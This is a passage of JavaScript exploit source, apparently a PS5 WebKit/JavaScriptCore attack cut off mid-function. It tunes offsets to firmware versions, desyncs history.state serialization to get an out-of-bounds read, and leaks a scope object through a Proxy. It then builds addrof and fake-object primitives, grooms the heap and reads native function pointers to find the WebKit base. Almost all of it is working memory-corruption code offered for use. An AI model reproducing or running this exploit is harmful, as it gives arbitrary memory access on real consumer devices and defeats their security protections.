const DRAIN_COUNT = 512;
const AUTO_RETRY_DELAY_MS = 50;

// Safari 15.4 (PS5 7.00-8.60) differs from Safari 17.x (PS5 9.00+) in
// JSArrayBufferView: m_length is size_t at +0x18, pushing TypedArrayMode m_mode
// to +0x20, while 9.00+ has m_mode at +0x1c with real padding at +0x20..+0x27.
// Confirmed in WebKit OSS JSArrayBufferView.h and by a 7.00 devkit dump
// (length 0x100 at +0x18, mode 0x02 WastefulTypedArray at +0x20).
const LOWFW_VIEW = (function () {
    try {
        const m = navigator.userAgent.match(/PlayStation 5[^)]*?([0-9]+\.[0-9]+)/);
        return !!(m && parseFloat(m[1]) < 9.00);
    } catch (e) { }
    return false;
})();

// K sets the BigInt/object mix of the filler graph, and therefore how far the
// deserializer's pool count runs ahead of the serializer's (BigInts pool on the
// read side only). That divergence pushes the ObjectReference index across the
// 0xFFFF width tier and produces the desync. Measured on a 7.00 devkit:
//   K=1 -> no desync (composition length stays 0x10000)
//   K=2 -> "Unable to deserialize data" on most attempts (the 9.00+ value)
//   K=3 -> desync fires, length 0x50001, OOB read reached (also K=5,7,8)
// The desync only lines up on some heap layouts, so attempts rotate through
// K_CANDIDATES and re-roll the layout instead of losing the same way. 9.00+
// keeps a fixed K=2.
const K = (function () {
    try {
        const m = navigator.userAgent.match(/PlayStation 5[^)]*?([0-9]+\.[0-9]+)/);
        if (m && parseFloat(m[1]) < 9.00)
            return 3;
    } catch (e) { }
    return 2;
})();
const DUPLICATE_INDEX = 2;
const CONTROL_INDEX = 0xffff;
const CONTROL_INT = -64000;
const K_CANDIDATES = LOWFW_VIEW ? [3, 5, 7, 8] : [K];
function currentK() {
    return K_CANDIDATES[attemptNumber % K_CANDIDATES.length];
}
const EXPECTED_LENGTH = 0x50001;
const CELL_BYTES = 0x30;
const FUNCTION_BYTES = 0x20;
const NATIVE_EXECUTABLE_BYTES = 0x38;
const HOLDER_BYTES = 0x40;

// 9.00 copies 924,176 UTF-16 characters from this backing store (~1.85 MB).
// This capacity is part of the 9.00 JSC exploit geometry, not merely spare
// storage.  At 9,000,000 slots the corrupted Symbol copy is consistently
// 924,176 characters.  Reducing it to 2,000,000 changes that copy to a bogus
// 17,701,392 characters and makes the safe retry exhaust the WebProcess.
const CARRIER_SLOTS = 9000000;
const CARRIER_BYTES = CARRIER_SLOTS * 8;
const CAPTURE_DELAY_MS = 50;
const COMPOSE_DELAY_MS = 100;

const symbolToString = Symbol.prototype.toString;

const DRAIN_SIZE = 0x10000;
const SLAB_SIZE = 0x400000;
const BUTTERFLY_HOLE_SIZE = 0x81000;
const SEPARATOR_SIZE = 0x10000;
const EARLY_HOLE_SIZE = 0x70000;
const GUARD_SIZE = 0x90000;
const PREDECESSOR_SIZE = 0x80000;
const FINAL_HOLE_SIZE = 0x80000;

const RW_BUFFER_SIZE = 0x100;

const IDENT_OFFSET = 0x20;

const LEAK_SLOT_INDEX = 2;
const LEAK_SLOT_OFFSET = 0x10 + 8 * LEAK_SLOT_INDEX;

const REVISION = "slopkit-core-final";
const attemptKey = `${REVISION}:attempts`;

const burstKey = `${REVISION}:burst`;

const rwHeader = new Uint8Array(CELL_BYTES);
const targetHeader = new Uint8Array(NATIVE_EXECUTABLE_BYTES);
const holderHeader = new Uint8Array(HOLDER_BYTES);
const scratchBits = new ArrayBuffer(8);
const scratchBytes = new Uint8Array(scratchBits);
const scratchWords = new Uint32Array(scratchBits);
const scratchDouble = new Float64Array(scratchBits);

const identityMagic = new Uint8Array([0x5a, 0xa5, 0xc3, 0x3c,
    0xde, 0xad, 0xbe, 0xef]);
const identityBytes = new Uint8Array(8);

let attemptNumber = 0;
let attemptCeiling = 0;
let keepIndex = 0;
let stopped = false;
let keepAlive = null;
let onEvent = null;
let criticalBarrier = null;
let settleResolve = null;
let settleReject = null;
let running = false;

let referenceTarget = null;
let rwBuffer = null;
let rwView = null;
let rwMirror = null;
let targetBuffer = null;
let targetView = null;
const nativeTarget = parseInt;
let fakeHost = null;
let lengthWord = null;
let anchorElement = null;
let markerObjectA = null;
let markerObjectB = null;
let targetHolder = null;
let holderGuardA = null;
let holderGuardB = null;
let fillerGraph = null;
let outerGraph = null;

let leakedScope = null;
let getterCarrier = null;
let preparedSymbolObject = null;
let capturedString = null;
let capturedWords = null;
let copiedLength = 0;
let captureState = 0;
let captureError = null;
let hostAddress = NaN;
let fakeAddress = NaN;

let predecessorWords = null;
let pointerLow = 0;
let pointerHigh = 0;
let targetAddress = NaN;
let targetAddressLow = 0;
let targetAddressHigh = 0;
let nativeTargetAddress = NaN;
let anchorElementAddress = NaN;
let markerAAddress = NaN;
let markerBAddress = NaN;

let rwOriginalVector = NaN;
let rwHeaderOK = false;
let holderHeaderOK = false;
let functionHeaderOK = false;
let nativeExecutableHeaderOK = false;
let functionStructureID = 0;
let nativeExecutableStructureID = 0;
let executableAddress = NaN;
let nativeFunctionAddress = NaN;
let nativeConstructorAddress = NaN;
let pointersRepeated = false;
let restoreObserved = false;
let retrySafe = false;
let retryScheduled = false;
let attemptPersisted = false;
let candidateEverReturned = false;
let candidateMutationStarted = false;
let zeroHeaderMiss = false;
let identityResult = 0;

let compositionState = 0;
let compositionLength = 0;
let compositionError = null;

let liveCandidate = null;
let fakeReleased = false;

const UNSEEN = -1;
const profile = {

    carrierSID: UNSEEN, carrierType: UNSEEN, carrierFlags: UNSEEN,
    carrierMode: UNSEEN, carrierByte28: UNSEEN,
    holderSID: UNSEEN, holderType: UNSEEN, holderFlags: UNSEEN,
    functionSID: UNSEEN, functionType: UNSEEN, functionFlags: UNSEEN,
    nativeExecSID: UNSEEN, nativeExecType: UNSEEN, nativeExecFlags: UNSEEN,
    cellSize: UNSEEN,

    vectorOffset: 0x10, inlineSlotOffset: 0x10, butterflyOffset: 0x08,
    vectorOffsetMeasured: false
};

function resetProfile() {
    profile.carrierSID = UNSEEN; profile.carrierType = UNSEEN;
    profile.carrierFlags = UNSEEN; profile.carrierMode = UNSEEN;
    profile.carrierByte28 = UNSEEN;
    profile.holderSID = UNSEEN; profile.holderType = UNSEEN;
    profile.holderFlags = UNSEEN;
    profile.functionSID = UNSEEN; profile.functionType = UNSEEN;
    profile.functionFlags = UNSEEN;
    profile.nativeExecSID = UNSEEN; profile.nativeExecType = UNSEEN;
    profile.nativeExecFlags = UNSEEN;
}

function hex(value) {
    return `0x${value.toString(16)}`;
}

function buffer(size) {
    return new ArrayBuffer(size);
}

function allZero(bytes, start, end) {
    for (let i = start; i < end; ++i) {
        if (bytes[i] !== 0)
            return false;
    }
    return true;
}

function uint32At(bytes, offset) {
    return bytes[offset]
        + bytes[offset + 1] * 0x100
        + bytes[offset + 2] * 0x10000
        + bytes[offset + 3] * 0x1000000;
}

function low48At(bytes, offset) {
    return bytes[offset]
        + bytes[offset + 1] * 0x100
        + bytes[offset + 2] * 0x10000
        + bytes[offset + 3] * 0x1000000
        + bytes[offset + 4] * 0x100000000
        + bytes[offset + 5] * 0x10000000000;
}

function readBytes(destination, source, count) {
    for (let i = 0; i < count; ++i)
        destination[i] = source[i];
}

function sameBytes(left, right, count) {
    for (let i = 0; i < count; ++i) {
        if (left[i] !== right[i])
            return false;
    }
    return true;
}

function readTwiceMatches(destination, source, count) {
    readBytes(destination, source, count);
    return sameBytes(destination, source, count);
}

function aimCarrier(candidate, address) {
    const high = Math.floor(address / 0x100000000);
    scratchWords[0] = address - high * 0x100000000;
    scratchWords[1] = high;
    for (let i = 0; i < 8; ++i)
        candidate[0x10 + i] = scratchBytes[i];
}

function restoreCarrier(candidate) {
    for (let i = 0; i < 8; ++i)
        candidate[0x10 + i] = rwHeader[0x10 + i];
}

function pointerFromWords(words, offset) {
    if (words[offset + 3] !== 0)
        return NaN;
    return words[offset]
        + words[offset + 1] * 0x10000
        + words[offset + 2] * 0x100000000;
}

function plausibleCell(value) {
    return value > 0x100000000
        && value <= 0xffffffffffff
        && value <= 9007199254740991
        && Math.floor(value) === value
        && value % 8 === 0;
}

function plausibleAddress(value) {
    return value > 0x100000000
        && value <= 0xffffffffffff
        && value <= 9007199254740991
        && Math.floor(value) === value;
}

function canonicalLow48(bytes, offset) {
    return bytes[offset + 6] === 0 && bytes[offset + 7] === 0;
}

function dumpHex(bytes, count) {
    let out = "";
    for (let i = 0; i < count; ++i)
        out += bytes[i].toString(16).padStart(2, "0");
    return out;
}

function encodedHeaderNumber() {
    const raw = new ArrayBuffer(8);
    const u32 = new Uint32Array(raw);
    const f64 = new Float64Array(raw);
    u32[0] = 0x00004250;
    u32[1] = 0x01062800;
    return f64[0];
}

function emit(tag, detail) {
    if (onEvent === null)
        return;
    try { onEvent(tag, detail === undefined ? "" : String(detail), attemptNumber); }
    catch {  }
}

function checkCarrierIdentity(candidate) {
    if (!plausibleAddress(rwOriginalVector) || rwOriginalVector % 8 !== 0
        || IDENT_OFFSET + 8 > RW_BUFFER_SIZE)
        return 0;
    aimCarrier(candidate, rwOriginalVector + IDENT_OFFSET);
    readBytes(identityBytes, rwView, 8);
    restoreCarrier(candidate);
    return sameBytes(identityBytes, identityMagic, 8) && rwView[0] === 0x3c
        ? 1 : -1;
}

function runIdentityProof(candidate) {
    candidateMutationStarted = true;
    identityResult = checkCarrierIdentity(candidate);
    return identityResult === 1;
}

function ceilingReached() {
    return attemptCeiling > 0 && attemptNumber >= attemptCeiling;
}

function giveUp(reason) {
    stopped = true;
    emit("CORE-GIVE-UP", `reason=${reason}-attempts=${attemptNumber}`);
    const reject = settleReject;
    settleResolve = null;
    settleReject = null;
    running = false;
    if (reject !== null)
        reject(new Error(`core: gave up after ${attemptNumber} attempts (${reason})`));
}

function failed() {
    if (ceilingReached()) {
        giveUp("attempt-ceiling");
        return;
    }
    emit("AUTO-RETRY-AFTER-FAILURE", `attempt=${attemptNumber}`);
    stopped = false;
    retryScheduled = false;
    setTimeout(() => {
        try { history.replaceState(null, ""); } catch { }
        attemptNumber++;
        startAttempt();
    }, AUTO_RETRY_DELAY_MS);
}

function releaseAttemptAllocations() {
    // Drop the safe attempt before the retry timer so JSC gets an idle turn to
    // reclaim it instead of overlapping two carrier/string/SSV graphs.
    referenceTarget = null;
    rwBuffer = null;
    rwView = null;
    rwMirror = null;
    targetBuffer = null;
    targetView = null;
    fakeHost = null;
    lengthWord = null;
    anchorElement = null;
    markerObjectA = null;
    markerObjectB = null;
    targetHolder = null;
    holderGuardA = null;
    holderGuardB = null;
    fillerGraph = null;
    outerGraph = null;
    leakedScope = null;
    getterCarrier = null;
    preparedSymbolObject = null;
    capturedString = null;
    capturedWords = null;
    predecessorWords = null;
    keepAlive = null;
    try { history.replaceState(null, ""); } catch { }
    if (typeof globalThis.gc === "function") {
        try { globalThis.gc(); } catch { }
    }
}

function scheduleSafeRetry(reason) {
    if (retryScheduled || stopped)
        return;
    const candidateStateSafe = !candidateEverReturned
        || (zeroHeaderMiss && !candidateMutationStarted);

    if (!retrySafe || !candidateStateSafe
        || candidateMutationStarted || !attemptPersisted) {
        emit("AUTO-RETRY-NOT-SCHEDULED", `reason=${reason}`
            + `-safe=${retrySafe}`
            + `-candidate-seen=${candidateEverReturned}`
            + `-candidate-mutated=${candidateMutationStarted}`
            + `-candidate-state-safe=${candidateStateSafe}`
            + `-attempt-persisted=${attemptPersisted}`);
        failed();
        return;
    }
    if (ceilingReached()) {
        giveUp("attempt-ceiling");
        return;
    }

    retryScheduled = true;
    const nextAttempt = attemptNumber + 1;
    emit("AUTO-RETRY-SCHEDULED", `reason=${reason}-next-attempt=${nextAttempt}`);
    releaseAttemptAllocations();
    setTimeout(() => {
        const candidateStillSafe = !candidateEverReturned
            || (zeroHeaderMiss && !candidateMutationStarted);
        if (!retrySafe || !candidateStillSafe
            || candidateMutationStarted || stopped) {
            emit("AUTO-RETRY-CANCELLED", `reason=${reason}`
                + `-retry-safe=${retrySafe}`
                + `-candidate-safe=${candidateStillSafe}`
                + `-candidate-mutated=${candidateMutationStarted}`);
            failed();
            return;
        }

        attemptNumber = nextAttempt;
        startAttempt();
    }, Math.max(AUTO_RETRY_DELAY_MS, 750));
}

function finishEarlySafeAttempt(tag, extra, reason) {
    retrySafe = true;
    emit(tag, `${extra}-retry-safe=true-candidate-seen=false`
        + "-candidate-mutated=false");
    scheduleSafeRetry(reason);
}

function resetAttemptState() {
    referenceTarget = null;
    rwBuffer = null;
    rwView = null;
    rwMirror = null;
    targetBuffer = null;
    targetView = null;
    fakeHost = null;
    lengthWord = null;
    anchorElement = null;
    markerObjectA = null;
    markerObjectB = null;
    targetHolder = null;
    holderGuardA = null;
    holderGuardB = null;
    fillerGraph = null;
    outerGraph = null;
    leakedScope = null;
    getterCarrier = null;
    preparedSymbolObject = null;
    capturedString = null;
    capturedWords = null;
    copiedLength = 0;
    captureState = 0;
    captureError = null;
    hostAddress = NaN;
    fakeAddress = NaN;
    predecessorWords = null;
    keepAlive = new Array(DRAIN_COUNT + 3);
    keepIndex = 0;
    pointerLow = 0;
    pointerHigh = 0;
    targetAddress = NaN;
    targetAddressLow = 0;
    targetAddressHigh = 0;
    nativeTargetAddress = NaN;
    anchorElementAddress = NaN;
    markerAAddress = NaN;
    markerBAddress = NaN;
    rwOriginalVector = NaN;
    rwHeaderOK = false;
    holderHeaderOK = false;
    functionHeaderOK = false;
    nativeExecutableHeaderOK = false;
    functionStructureID = 0;
    nativeExecutableStructureID = 0;
    executableAddress = NaN;
    nativeFunctionAddress = NaN;
    nativeConstructorAddress = NaN;
    pointersRepeated = false;
    restoreObserved = false;
    retrySafe = false;
    retryScheduled = false;
    candidateEverReturned = false;
    candidateMutationStarted = false;
    zeroHeaderMiss = false;
    identityResult = 0;
    identityBytes.fill(0);
    compositionState = 0;
    compositionLength = 0;
    compositionError = null;
    liveCandidate = null;
    resetProfile();
    rwHeader.fill(0);
    targetHeader.fill(0);
    holderHeader.fill(0);
}

function startAttempt() {

    if (fakeReleased)
        return;
    if (stopped)
        return;
    resetAttemptState();
    try {
        sessionStorage.setItem(attemptKey, String(attemptNumber));
        attemptPersisted = sessionStorage.getItem(attemptKey)
            === String(attemptNumber);
    } catch { }
    emit("ATTEMPT-START", `attempt-persisted=${attemptPersisted}`
        + `-capture-ms=${CAPTURE_DELAY_MS}-compose-ms=${COMPOSE_DELAY_MS}`);
    try {
        buildAndStoreGraph();

        for (let i = 0; i < 8; ++i)
            rwView[IDENT_OFFSET + i] = identityMagic[i];
        prepareAddrof();
    } catch (error) {
        finishEarlySafeAttempt("SETUP-THREW",
            `${error?.name}:${String(error?.message).slice(0, 80)}`,
            "setup-threw");
    }
}

function leakScopeObject() {
    class Leaker { leak() { return super.foo; } }
    Leaker.prototype.__proto__ = new Proxy({}, {
        get: function (target, property, receiver) { return receiver; }
    });
    const leak = Leaker.prototype.leak;
    return (function () { return leak(); })();
}

function prepareSymbolWrapper(F) {
    leakedScope = leakScopeObject();
    if (leakedScope === undefined || leakedScope === null)
        throw new Error("scope-not-leaked");

    for (let i = 0; i < 512; i++)
        leakedScope[`p${i}`] = i;
    for (let j = 0; j < 8; j++)
        leakedScope[j] = 1.1 * j;

    Object.defineProperty(leakedScope, "g", { get: F, configurable: true });
    return Object(leakedScope.g);
}

function buildFakeHost() {
    rwBuffer = new ArrayBuffer(RW_BUFFER_SIZE);
    rwView = new Uint8Array(rwBuffer);
    rwMirror = new Uint8Array(rwBuffer);
    rwMirror[0] = 0x3c;

    targetBuffer = new ArrayBuffer(0x20);
    targetView = new Uint8Array(targetBuffer);
    targetView[0] = 0xa5;
    lengthWord = { keep: 0x51515151 };

    fakeHost = {
        q0: encodedHeaderNumber(),
        q1: 1.1,
        q2: rwView,
        q3: lengthWord,
        q4: 2.2,
        q5: 3.3
    };

    delete fakeHost.q1;
    delete fakeHost.q4;
    delete fakeHost.q5;

    if (!Number.isFinite(fakeHost.q0) || fakeHost.q2 !== rwView
        || fakeHost.q3 !== lengthWord || rwView[0] !== 0x3c
        || targetView[0] !== 0xa5 || typeof nativeTarget !== "function")
        throw new Error("fake-host-shape-failed");

    anchorElement = document.createElement("textarea");
    markerObjectA = { marker: 0x4d41524b, kind: "probe-marker-a" };
    markerObjectB = { marker: 0x4d41524c, kind: "probe-marker-b" };
    holderGuardA = { marker: 0x484f4c44 };
    holderGuardB = { marker: 0x47554152 };
    targetHolder = {
        q0: nativeTarget,
        q1: anchorElement,
        q2: markerObjectA,
        q3: markerObjectB,
        q4: holderGuardA,
        q5: holderGuardB
    };

    if (targetHolder.q0 !== nativeTarget || targetHolder.q1 !== anchorElement
        || targetHolder.q2 !== markerObjectA
        || targetHolder.q3 !== markerObjectB
        || targetHolder.q4 !== holderGuardA || targetHolder.q5 !== holderGuardB
        || anchorElement === null || typeof anchorElement !== "object"
        || markerObjectA.marker !== 0x4d41524b
        || markerObjectB.marker !== 0x4d41524c)
        throw new Error("probe-holder-shape-failed");
}

function buildAndStoreGraph() {
    referenceTarget = { marker: 0x51515151, kind: "serialized-reference" };
    buildFakeHost();

    const kNow = currentK();
    const fillerBigints = kNow - 1;
    const fillerObjects = 0xfffe - kNow;
    emit("SSV-BUILD", `k=${kNow}-n=${DRAIN_COUNT}`);
    fillerGraph = new Array(0xfffd);
    let pos = 0;
    const huge = 1n << 40n;
    for (let b = 0; b < fillerBigints; ++b)
        fillerGraph[pos++] = huge + BigInt(b);
    for (let o = 0; o < fillerObjects; ++o)
        fillerGraph[pos++] = {};

    outerGraph = new Array(CONTROL_INDEX + 1);
    outerGraph[0] = fillerGraph;
    outerGraph[1] = referenceTarget;
    outerGraph[2] = referenceTarget;
    outerGraph[CONTROL_INDEX] = CONTROL_INT;
    emit("SSV-BUILT", `duplicate-index=${DUPLICATE_INDEX}`);

    emit("SSV-STORE-ENTER", `writer-ref=0x${(0x10000 - kNow).toString(16)}`);
    history.replaceState(outerGraph, "");
    emit("SSV-STORED", "fake-host-and-probe-holder-not-serialized");
}

function prepareAddrof() {
    capturedWords = new Uint16Array(16);
    getterCarrier = function getterCarrierFunction() { return 7; };

    emit("ADDROF-PREP-BEGIN", `slots=${CARRIER_SLOTS}-bytes=${CARRIER_BYTES}`);
    getterCarrier[0] = fakeHost;
    for (let i = 1; i < CARRIER_SLOTS; i++)
        getterCarrier[i] = 0;
    getterCarrier[1] = targetHolder;
    getterCarrier[2] = fakeHost;
    getterCarrier[3] = targetHolder;
    emit("ADDROF-CARRIER-DONE", "host-holder-host-holder");

    preparedSymbolObject = prepareSymbolWrapper(getterCarrier);
    emit("ADDROF-WRAPPER-READY", `wait=${CAPTURE_DELAY_MS}ms`);

    setTimeout(runAddrofCapture, CAPTURE_DELAY_MS);
    setTimeout(beginComposition, COMPOSE_DELAY_MS);
}

function runAddrofCapture() {
    try {
        capturedString = symbolToString.call(preparedSymbolObject);
        copiedLength = capturedString.length;
        for (let i = 0; i < 16; i++)
            capturedWords[i] = capturedString.charCodeAt(7 + i);
        captureState = 1;
    } catch (error) {
        captureError = error;
        captureState = -1;
    }
}

function fillRawCellPointers(backing, pointer) {
    pointerHigh = Math.floor(pointer / 0x100000000);
    pointerLow = pointer - pointerHigh * 0x100000000;

    if (!plausibleCell(pointer)
        || pointerHigh < 0 || pointerHigh > 0xffff
        || Math.floor(pointerLow) !== pointerLow
        || pointerLow < 0 || pointerLow > 0xffffffff
        || pointerLow + pointerHigh * 0x100000000 !== pointer)
        throw new Error("invalid-low48-fake-address");

    predecessorWords = new Uint32Array(backing);
    for (let i = 0; i < predecessorWords.length; i += 2) {
        predecessorWords[i] = pointerLow;
        predecessorWords[i + 1] = pointerHigh;
    }

    const last = predecessorWords.length - 2;
    if (predecessorWords[0] !== pointerLow
        || predecessorWords[1] !== pointerHigh
        || predecessorWords[last] !== pointerLow
        || predecessorWords[last + 1] !== pointerHigh)
        throw new Error("pointer-fill-verification-failed");
}

function clearPredecessor() {
    if (predecessorWords !== null)
        predecessorWords.fill(0);
}

function loadHistoryCritical() {
    let result = null;
    let candidate = null;
    let rwHeaderCaptured = false;
    let rwVectorTouched = false;
    try {
        result = history.state;
        compositionLength = result.length;

        if (compositionLength !== EXPECTED_LENGTH) {
            result[DUPLICATE_INDEX] = undefined;
            result = null;
            clearPredecessor();
            retrySafe = true;
            compositionState = 3;
            return;
        }

        if (result[1] === result[DUPLICATE_INDEX]) {
            result[DUPLICATE_INDEX] = undefined;
            candidate = null;
            result = null;
            clearPredecessor();
            retrySafe = true;
            compositionState = 2;
            return;
        }

        candidate = result[DUPLICATE_INDEX];
        candidateEverReturned = true;
        result[DUPLICATE_INDEX] = undefined;
        result = null;

        readBytes(rwHeader, candidate, CELL_BYTES);
        rwHeaderCaptured = true;

        const rwSID = uint32At(rwHeader, 0);
        const rwButterfly = low48At(rwHeader, 8);
        const rwLength = uint32At(rwHeader, 0x18);
        rwOriginalVector = low48At(rwHeader, 0x10);

        // 15.4: +0x20 holds m_mode (uint32), so only +0x24..+0x27 is padding.
        // 9.00+: m_mode is at +0x1c and +0x20..+0x27 really is padding.
        const rwOffsetZero = LOWFW_VIEW
            ? (rwHeader[0x20] <= 3 && rwHeader[0x21] === 0
               && rwHeader[0x22] === 0 && rwHeader[0x23] === 0
               && allZero(rwHeader, 0x24, 0x28))
            : allZero(rwHeader, 0x20, 0x28);

        profile.carrierSID = rwSID;
        profile.carrierType = rwHeader[5];
        profile.carrierFlags = rwHeader[6];
        profile.carrierMode = LOWFW_VIEW ? rwHeader[0x20] : rwHeader[0x1c];
        profile.carrierByte28 = rwHeader[0x28];

        rwHeaderOK = rwSID >= 0x100 && rwSID < 0x08000000
            && rwHeader[4] === 0
            && (rwHeader[7] === 0 || rwHeader[7] === 1)
            && rwHeader[0x0e] === 0 && rwHeader[0x0f] === 0
            && rwButterfly > 0x100000000 && rwButterfly % 8 === 0
            && rwHeader[0x16] === 0 && rwHeader[0x17] === 0
            && rwOriginalVector > 0x100000000 && rwOriginalVector % 8 === 0
            && rwLength === RW_BUFFER_SIZE
            && rwHeader[0x1d] === 0
            && rwHeader[0x1e] === 0 && rwHeader[0x1f] === 0
            && rwOffsetZero;

        if (!rwHeaderOK) {
            zeroHeaderMiss = allZero(rwHeader, 0, CELL_BYTES);
            retrySafe = zeroHeaderMiss && !rwVectorTouched
                && !candidateMutationStarted;
            candidate = null;
            clearPredecessor();
            compositionState = 3;
            return;
        }

        rwVectorTouched = true;
        const identityProved = runIdentityProof(candidate);
        rwVectorTouched = false;
        if (!identityProved) {
            candidate = null;
            clearPredecessor();
            compositionState = 3;
            return;
        }

        for (let i = 0; i < 8; ++i)
            scratchBytes[i] = rwHeader[i];
        if (scratchBytes[6] >= 2) {
            scratchBytes[6] -= 2;
        } else {
            scratchBytes[6] = (scratchBytes[6] + 0x100 - 2) & 0xff;
            scratchBytes[7] = (scratchBytes[7] - 1) & 0xff;
        }
        const upgradedHeader = scratchDouble[0];

        const upgradedFinite = upgradedHeader === upgradedHeader
            && upgradedHeader !== Infinity && upgradedHeader !== -Infinity;
        if (!upgradedFinite) {
            candidate = null;
            clearPredecessor();
            compositionState = 3;
            return;
        }

        candidateMutationStarted = true;
        fakeHost.q0 = upgradedHeader;
        if (fakeHost.q0 !== upgradedHeader) {
            candidate = null;
            clearPredecessor();
            compositionState = 3;
            return;
        }

        rwVectorTouched = true;
        aimCarrier(candidate, targetAddress);

        const holderRepeated = readTwiceMatches(holderHeader, rwView,
            HOLDER_BYTES);
        const holderSID = uint32At(holderHeader, 0);
        const holderButterflyZero = allZero(holderHeader, 0x08, 0x10);

        nativeTargetAddress = low48At(holderHeader, 0x10);
        anchorElementAddress = low48At(holderHeader, 0x18);
        markerAAddress = low48At(holderHeader, 0x20);
        markerBAddress = low48At(holderHeader, 0x28);
        const holderGuardAAddress = low48At(holderHeader, 0x30);
        const holderGuardBAddress = low48At(holderHeader, 0x38);
        profile.holderSID = holderSID;
        profile.holderType = holderHeader[5];
        profile.holderFlags = holderHeader[6];

        holderHeaderOK = holderRepeated
            && holderSID >= 0x100 && holderSID < 0x08000000
            && targetAddress % 0x10 === 0
            && holderHeader[4] === 0
            && (holderHeader[7] === 0 || holderHeader[7] === 1)
            && holderButterflyZero
            && plausibleCell(nativeTargetAddress)
            && plausibleCell(anchorElementAddress)
            && plausibleCell(markerAAddress)
            && plausibleCell(markerBAddress)
            && plausibleCell(holderGuardAAddress)
            && plausibleCell(holderGuardBAddress)
            && canonicalLow48(holderHeader, 0x10)
            && canonicalLow48(holderHeader, 0x18)
            && canonicalLow48(holderHeader, 0x20)
            && canonicalLow48(holderHeader, 0x28)
            && canonicalLow48(holderHeader, 0x30)
            && canonicalLow48(holderHeader, 0x38)
            && nativeTargetAddress !== anchorElementAddress
            && nativeTargetAddress !== markerAAddress
            && anchorElementAddress !== markerAAddress
            && markerAAddress !== markerBAddress
            && holderGuardAAddress !== holderGuardBAddress;

        if (!holderHeaderOK) {
            restoreCarrier(candidate);
            rwVectorTouched = false;
            candidate = null;
            clearPredecessor();
            compositionState = 3;
            return;
        }

        aimCarrier(candidate, nativeTargetAddress);
        readBytes(targetHeader, rwView, FUNCTION_BYTES);

        functionStructureID = uint32At(targetHeader, 0);
        const functionButterfly = low48At(targetHeader, 0x08);
        const functionScope = low48At(targetHeader, 0x10);
        executableAddress = low48At(targetHeader, 0x18);
        profile.functionSID = functionStructureID;
        profile.functionType = targetHeader[5];
        profile.functionFlags = targetHeader[6];
        const functionType1 = targetHeader[5];
        functionHeaderOK = functionStructureID >= 0x100
            && functionStructureID < 0x08000000
            && nativeTargetAddress % 0x10 === 0
            && targetHeader[4] === 0
            && (targetHeader[7] === 0 || targetHeader[7] === 1)
            && targetHeader[0x0e] === 0 && targetHeader[0x0f] === 0
            && targetHeader[0x16] === 0 && targetHeader[0x17] === 0
            && targetHeader[0x1e] === 0 && targetHeader[0x1f] === 0
            && functionButterfly > 0x100000000
            && functionButterfly <= 0xffffffffffff
            && functionButterfly % 8 === 0
            && functionScope > 0x100000000
            && functionScope <= 0xffffffffffff
            && functionScope % 8 === 0
            && executableAddress > 0x100000000
            && executableAddress <= 0xffffffffffff
            && executableAddress % 0x10 === 0
            && (executableAddress & 1) === 0;

        if (!functionHeaderOK) {
            restoreCarrier(candidate);
            rwVectorTouched = false;
            candidate = null;
            clearPredecessor();
            compositionState = 3;
            return;
        }

        aimCarrier(candidate, executableAddress);
        readBytes(targetHeader, rwView, NATIVE_EXECUTABLE_BYTES);

        nativeExecutableStructureID = uint32At(targetHeader, 0);
        nativeFunctionAddress = low48At(targetHeader, 0x28);
        nativeConstructorAddress = low48At(targetHeader, 0x30);
        profile.nativeExecSID = nativeExecutableStructureID;
        profile.nativeExecType = targetHeader[5];
        profile.nativeExecFlags = targetHeader[6];
        // 9.00+ resolves webkitBase from this instead of a vtable rva
        try { globalThis.__ps5NativeCtor = nativeConstructorAddress; } catch (e) { }
        const nativeExecType1 = targetHeader[5];

        nativeExecutableHeaderOK = nativeExecutableStructureID >= 0x100
            && nativeExecutableStructureID < 0x08000000
            && targetHeader[4] === 0
            && (targetHeader[7] === 0 || targetHeader[7] === 1)
            && targetHeader[0x2e] === 0 && targetHeader[0x2f] === 0
            && targetHeader[0x36] === 0 && targetHeader[0x37] === 0
            && plausibleAddress(nativeFunctionAddress)
            && plausibleAddress(nativeConstructorAddress)
            && canonicalLow48(targetHeader, 0x28)
            && canonicalLow48(targetHeader, 0x30)
            && nativeFunctionAddress !== nativeConstructorAddress;

        if (!nativeExecutableHeaderOK) {
            restoreCarrier(candidate);
            rwVectorTouched = false;
            candidate = null;
            clearPredecessor();
            compositionState = 3;
            return;
        }

        aimCarrier(candidate, nativeTargetAddress);
        const executableAddress2 = low48At(rwView, 0x18);
        const functionType2 = rwView[5];

        aimCarrier(candidate, executableAddress);
        const nativeFunctionAddress2 = low48At(rwView, 0x28);
        const nativeConstructorAddress2 = low48At(rwView, 0x30);
        const nativeExecutableType2 = rwView[5];

        pointersRepeated = executableAddress2 === executableAddress
            && nativeFunctionAddress2 === nativeFunctionAddress
            && nativeConstructorAddress2 === nativeConstructorAddress
            && functionType2 === functionType1
            && nativeExecutableType2 === nativeExecType1;

        restoreCarrier(candidate);
        rwVectorTouched = false;
        targetView[0] = 0xa5;
        rwMirror[0] = 0x3c;
        restoreObserved = rwView[0] === 0x3c
            && rwMirror[0] === 0x3c && targetView[0] === 0xa5;

        liveCandidate = candidate;
        candidate = null;
        clearPredecessor();
        compositionState = 1;
    } catch (error) {
        retrySafe = candidate === null && result === null
            && !rwHeaderCaptured && error?.name === "TypeError";
        if (result !== null) {
            try { result[DUPLICATE_INDEX] = undefined; } catch { }
        }
        if (candidate !== null && rwHeaderCaptured && rwVectorTouched) {
            try { restoreCarrier(candidate); } catch { }
        }
        candidate = null;
        result = null;
        try { targetView[0] = 0xa5; } catch { }
        try { rwMirror[0] = 0x3c; } catch { }
        try { clearPredecessor(); } catch { }
        compositionError = error;
        compositionState = -1;
    }
}

function runGroomAndLoad() {
    try {
        emit("SSV-GROOM-ENTER", `n=${DRAIN_COUNT}`);
        const channel = new MessageChannel();
        channel.port1.close();
        channel.port2.close();

        for (let i = 0; i < DRAIN_COUNT; ++i)
            keepAlive[keepIndex++] = buffer(DRAIN_SIZE);

        let slab = buffer(SLAB_SIZE);
        channel.port1.postMessage(0, [slab]);
        slab = null;

        const butterflyHole1 = buffer(BUTTERFLY_HOLE_SIZE);
        const butterflyHole2 = buffer(BUTTERFLY_HOLE_SIZE);
        const separator = buffer(SEPARATOR_SIZE);
        const earlyHole = buffer(EARLY_HOLE_SIZE);
        const guard = buffer(GUARD_SIZE);
        const predecessor = buffer(PREDECESSOR_SIZE);
        const finalHole = buffer(FINAL_HOLE_SIZE);

        fillRawCellPointers(predecessor, fakeAddress);
        keepAlive[keepIndex++] = separator;
        keepAlive[keepIndex++] = guard;
